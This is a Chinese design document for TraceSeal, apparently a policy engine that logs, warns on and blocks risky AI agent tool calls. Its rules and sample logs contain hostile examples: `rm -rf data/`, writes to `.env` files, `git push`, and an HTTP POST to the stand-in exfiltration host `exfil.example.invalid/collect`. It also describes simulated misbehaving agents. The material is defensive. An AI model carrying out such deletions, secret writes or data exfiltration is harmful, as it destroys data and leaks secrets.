# TraceSeal Policy 规则设计

> 当前 MVP 实现：`policy/default_policy.json` + `policy/rules.py`  
> 当前模式：默认 warn/mark；设置 `TRACESEAL_POLICY_MODE=block` 后，高危操作会被阻断或模拟阻断。

## 1. 当前规则总览

| rule_id | event_type | 触发条件 | risk_level | 默认 action | 对应案例 |
|---|---|---|---|---|---|
| `dangerous_delete` | `shell` | `rm -rf` / `rmdir /s /q` | critical | warn | `bad_agent_delete.py` |
| `env_write` | `file.write` | 写入 `.env` / `.env.*` | high | warn | `bad_agent_env.py` |
| `git_push` | `shell` | `git push ...` | high | warn | `bad_agent_git.py` |
| `suspicious_http_post` | `http` | HTTP `POST` 到外部 URL 或携带敏感字段 | high | warn | `bad_agent_http.py` |

每条规则至少包含：

- `rule_id`
- `event_type`
- `pattern` / `matcher`
- `risk_level`
- `action`
- `reason`
- `suggested_policy`

## 2. 当前 JSON 策略格式

示例来自 `policy/default_policy.json`：

```json
{
  "rule_id": "env_write",
  "event_type": "file.write",
  "pattern": ".env or .env.*",
  "matcher": "policy.rules.evaluate_file_write",
  "risk_level": "high",
  "action": "warn",
  "reason": "writing environment files can corrupt secrets/configuration",
  "suggested_policy": "deny file.write \".env*\""
}
```

## 3. 规则细节

### 3.1 dangerous_delete

- 匹配：`rm -rf`、`rm -fr`、`rmdir /s /q`
- 当前实现：`policy.rules.is_rm_rf()` + `rm_targets()`
- 行为：Windows/macOS/Linux demo 中由 SDK 模拟删除并记录 diff
- block 模式：返回 126 / 抛出 `CalledProcessError`

Explain 示例：

```text
首次有害工具调用:
[evt_0003] shell: rm -rf data/

原因:
- 请求递归强制删除: data/
- 删除了受保护路径: data/
- 命中策略规则: dangerous_delete

建议策略:
deny shell "rm -rf data/**"
```

### 3.2 env_write

- 匹配：`.env`、`.env.*`
- 当前实现：`policy.rules.evaluate_file_write()`
- 行为：记录 `file.write`，标记 high
- block 模式：在写入前阻断，避免敏感配置被创建/覆盖

Explain 示例：

```text
首次有害工具调用:
[evt_0002] file.write: .env

原因:
- 敏感环境配置文件被修改: .env
- 修改了受保护的环境配置文件
- 命中策略规则: env_write

建议策略:
deny file_write ".env*"
```

### 3.3 git_push

- 匹配：`git push ...`
- 当前实现：`policy.rules.is_git_push()`
- 行为：SDK 离线模拟，不执行真实 push，不接触远端
- block 模式：模拟阻断并记录 `status=blocked`

Explain 示例：

```text
首次有害工具调用:
[evt_0002] shell: git push origin main

原因:
- 请求远程 git push
- 命中策略规则: git_push

建议策略:
require_approval git "push"
```

### 3.4 suspicious_http_post

- 匹配：HTTP `POST`
- 当前实现：`policy.rules.evaluate_http_request()`
- 行为：`bad_agent_http.py` 默认启用 `TRACESEAL_OFFLINE_HTTP=1`，SDK 记录事件并返回 fake response，不访问真实外网
- block 模式：写入 `status=blocked` 并抛出 `PermissionError`

Explain 示例：

```text
首次有害工具调用:
[evt_0002] http: POST https://exfil.example.invalid/collect

原因:
- 可疑的出站 HTTP POST: POST https://exfil.example.invalid/collect
- 命中策略规则: suspicious_http_post

建议策略:
deny http "POST https://exfil.example.invalid/collect"
```

## 4. Policy 模式

| 模式 | 配置 | 行为 |
|---|---|---|
| warn | 默认或 `TRACESEAL_POLICY_MODE=warn` | 执行并记录风险。 |
| block | `TRACESEAL_POLICY_MODE=block` | high/critical 事件在执行前阻断或模拟阻断。 |

```powershell
$env:TRACESEAL_POLICY_MODE = "block"
python -m traceseal run python examples/bad_agent_env.py
```

## 5. 后续 policy.yaml DSL 方向

当前 `policy.yaml` 未实现。下一阶段可以把 JSON + Python matcher 升级为：

```yaml
version: "1.0"
default_action: warn
rules:
  - rule_id: dangerous_delete
    event_type: shell
    pattern: "rm -rf **"
    risk_level: critical
    action: deny
```

后续增强：路径 glob、域名白名单、force push 细分、审批模式、规则热加载。
